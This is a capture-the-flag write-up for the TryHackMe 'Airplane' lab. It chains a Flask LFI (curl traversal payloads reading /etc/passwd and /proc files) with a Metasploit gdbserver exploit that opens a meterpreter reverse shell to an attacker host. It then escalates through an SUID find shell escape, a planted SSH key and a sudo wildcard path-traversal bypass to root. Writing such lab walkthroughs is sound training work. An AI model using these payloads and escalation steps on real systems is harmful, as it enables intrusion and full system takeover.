# TryHackMe — Airplane: Writeup

> **Difficulty:** Medium · **Platform:** TryHackMe · **Date:** 14.11.2026

---

## 📋 Table of Contents

1. Preparation
2. Port Scanning
3. Web Application and LFI
4. Source Code Analysis
5. Process and User Identification
6. Discovering Listening Ports from Inside
7. Identifying the Service on 6048
8. Exploiting gdbserver → hudson Shell
9. Pivoting hudson → carlos via SUID find
10. carlos → root via sudo ruby wildcard
11. Final Chain
12. Dead Ends and Notes
13. Key Takeaways

---

## 1. Preparation

Add the host to `/etc/hosts`:

[code]
echo "10.112.172.165 airplane.thm" | sudo tee -a /etc/hosts
[/code]

Verify connectivity:

[code]
ping -c1 airplane.thm
[/code]

---

## 2. Port Scanning

[code]
nmap -p- --min-rate 5000 -T4 -Pn airplane.thm
[/code]

**Results:**

| Port | State | Service | Note |
|------|-------|---------|------|
| 22/tcp | open | SSH | OpenSSH |
| 8000/tcp | open | HTTP | Flask / Python |
| 6048/tcp | filtered | x11? | Misleading label — actually gdbserver |

> ⚠️ `6048` is labeled `x11` by nmap only because of the port number. The real service will be identified later via LFI.

---

## 3. Web Application and LFI

Opening `http://airplane.thm:8000/` redirects to `?page=index.html`. The `page` parameter is a potential LFI.

**Test:**

[code]
curl "http://airplane.thm:8000/?page=../../../../../../etc/passwd"
[/code]

✅ Works → **Path Traversal / LFI**.

**Save `/etc/passwd`:**

[code]
curl -s "http://airplane.thm:8000/?page=../../../../../../etc/passwd" -o passwd.txt
[/code]

**Key users:**

| User | UID | Shell |
|------|-----|-------|
| carlos | 1000 | /bin/bash |
| hudson | 1001 | /bin/bash |
| www-data | 33 | /usr/sbin/nologin |

---

## 4. Source Code Analysis

Read `app.py` via LFI:

[code]
curl -s "http://airplane.thm:8000/?page=../../../../../../proc/528/cwd/app.py"
[/code]

[code language="python"]
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)

@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')
        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False
            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))
            return resp
        else:
            return "Page not found"
    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)

@app.route('/airplane')
def airplane():
    return render_template('airplane.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
[/code]

**Conclusion:**

- Concatenation of `static/` + `page` **without normalization** → LFI.
- `send_file` only reads → **no RCE/SSTI**.

---

## 5. Process and User Identification

Read `/proc/self/environ`:

[code]
curl -s "http://airplane.thm:8000/?page=../../../../../../proc/self/environ"
[/code]

[code]
USER=hudson
HOME=/home/hudson
[/code]

→ The web server and LFI run **as `hudson`**.

Read `/etc/group`:

[code]
curl -s "http://airplane.thm:8000/?page=../../../../../../etc/group"
[/code]

**Key line:**

[code]
sudo:x:27:carlos
[/code]

→ **`carlos` is in the `sudo` group**. This is the final target.

---

## 6. Discovering Listening Ports from Inside

Read `/proc/net/tcp` — bypass the firewall and see what is actually listening:

[code]
curl -s "http://airplane.thm:8000/?page=../../../../../../proc/net/tcp" -o tcp.txt
[/code]

**Hex port decoding:**

| Hex | Dec | Address | UID | Service |
|-----|-----|---------|-----|---------|
| 1F40 | 8000 | 0.0.0.0 | hudson | web (LFI) |
| 17A0 | 6048 | 0.0.0.0 | hudson | ??? |
| 0016 | 22 | 0.0.0.0 | root | SSH |
| 0277 | 631 | 127.0.0.1 | root | CUPS |
| 0035 | 53 | 127.0.0.53 | systemd-resolve | DNS stub |

→ Port **6048** is listening as **hudson**, but is `filtered` from outside.

---

## 7. Identifying the Service on 6048

Brute-force PIDs via LFI and read `cmdline`:

[code]
for i in $(seq 1 1000); do
  resp=$(curl -s "http://airplane.thm:8000/?page=../../../../../../proc/$i/cmdline")
  if echo "$resp" | grep -q "gdbserver"; then
    echo "PID $i: $resp"
  fi
done
[/code]

**Result:**

[code]
PID 524: /usr/bin/gdbserver0.0.0.0:6048airplane
[/code]

→ **gdbserver on `0.0.0.0:6048`**. This is not X11 — it is a debug server.

---

## 8. Exploiting gdbserver → hudson Shell

Launch Metasploit:

[code]
msfconsole -q
[/code]

[code]
use exploit/multi/gdb/gdb_server_exec
set RHOSTS 10.112.172.165
set RPORT 6048
set LHOST 192.168.128.18
set LPORT 4444
set TARGET 1
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run
[/code]

> ⚠️ The exploit is **unstable** — several `run` attempts may be required.

Obtain a Meterpreter session. Drop into a shell:

[code]
shell
[/code]

Verify:

[code]
id
# uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
[/code]

**Stabilize the TTY:**

[code]
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
export SHELL=/bin/bash
[/code]

---

## 9. Pivoting hudson → carlos via SUID find

Search for SUID binaries:

[code]
find / -perm -4000 -type f 2>/dev/null
[/code]

We see `/usr/bin/find`. Check the owner:

[code]
ls -la /usr/bin/find
[/code]

`find` is **SUID owned by `carlos`**. Use GTFOBins:

[code]
/usr/bin/find . -exec /bin/sh -p \; -quit
id
# uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
[/code]

> ⚠️ This only grants `euid=carlos`. The Real UID remains `hudson`, so `sudo` will prompt for hudson's password.

### Obtaining a full carlos shell

Create an SSH key in carlos's home directory (we have `euid`):

[code]
cd /home/carlos/.ssh
ssh-keygen -t rsa -b 4096 -f id_rsa -N ""
cat id_rsa.pub >> authorized_keys
chmod 600 authorized_keys
cat id_rsa
[/code]

Copy the private key to your Kali box, save it as `carlos_id_rsa`:

[code]
chmod 600 carlos_id_rsa
ssh -i carlos_id_rsa carlos@airplane.thm
[/code]

**Verify:**

[code]
id
# uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),27(sudo)
[/code]

✅ Now **Real UID = carlos**.

---

## 10. carlos → root via sudo ruby wildcard

[code]
sudo -l
[/code]

**Result:**

[code]
User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
[/code]

The rule allows running **any Ruby script from `/root/` ending in `.rb`** without a password.

### Exploiting path traversal

Create a script in carlos's home directory:

[code]
echo 'exec "/bin/sh"' > /home/carlos/shell.rb
[/code]

Run it via sudo with a path traversal:

[code]
sudo /usr/bin/ruby /root/../home/carlos/shell.rb
[/code]

> 💡 The path `/root/../home/carlos/shell.rb` formally starts with `/root/` and ends with `.rb`, so it passes the sudo check, but actually points to a file in `/home/carlos/`.

**Obtain a root shell:**

[code]
id
# uid=0(root) gid=0(root) groups=0(root)
[/code]

**Capture the flags:**

[code]
cat /root/root.txt
cat /home/carlos/user.txt
[/code]

---

## 11. Final Chain

[code]
LFI (page)
  → read /etc/passwd, /etc/group (carlos in sudo)
  → read /proc/net/tcp (port 6048)
  → brute-force /proc/*/cmdline → gdbserver on 6048
  → Metasploit gdb_server_exec → hudson shell
  → SUID find (owned by carlos) → euid carlos
  → SSH key in /home/carlos/.ssh → full carlos shell
  → sudo -l: (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
  → path traversal /root/../home/carlos/shell.rb → root
  → root.txt + user.txt
[/code]

---

## 12. Dead Ends and Notes

| Vector | Result | Reason |
|--------|--------|--------|
| X11 on 6048 | ❌ dead end | nmap labels 6048 as `x11` based on the port number, but it is actually gdbserver. `xdpyinfo`/`xwd` hung because they were speaking the X11 protocol to gdbserver |
| PwnKit (CVE-2021-4034) | ❌ failed | `pkexec version 0.10` looks vulnerable, but the patch was likely backported; the compiled binary also hit a GLIBC mismatch. PwnKit is not used in Airplane writeups |
| SSH brute-force hudson | ❌ too slow/dead end | `UseDNS yes` (default) + possible fail2ban → ~0.6 attempts/sec, 14M passwords is unrealistic |
| Reading `/etc/shadow` | ❌ 500 | no permissions for hudson |
| `.ssh` hudson/carlos via LFI | ❌ empty | no keys present |

---

## 13. Key Takeaways

1. **Don't trust nmap port labels** — `6048` is labeled `x11`, but it is gdbserver. Always verify with `-sV` and confirm the service.
2. **`/proc/net/tcp` via LFI** — bypasses the firewall and reveals what is actually listening from inside.
3. **`/proc/*/cmdline` via LFI** — a direct way to find the process listening on an "unknown" port.
4. **SUID `find` owned by another user** only grants `euid`, not Real UID — a full shell (SSH key) is needed for `sudo`/SSH.
5. **Sudo wildcard with `*`** — a classic: the path `/root/../home/carlos/shell.rb` passes the pattern check but points to an accessible directory.
6. **PwnKit is not a universal solution**: version `0.10` looks vulnerable, but backported patches and GLIBC can kill the exploit. It is not needed for Airplane.

---

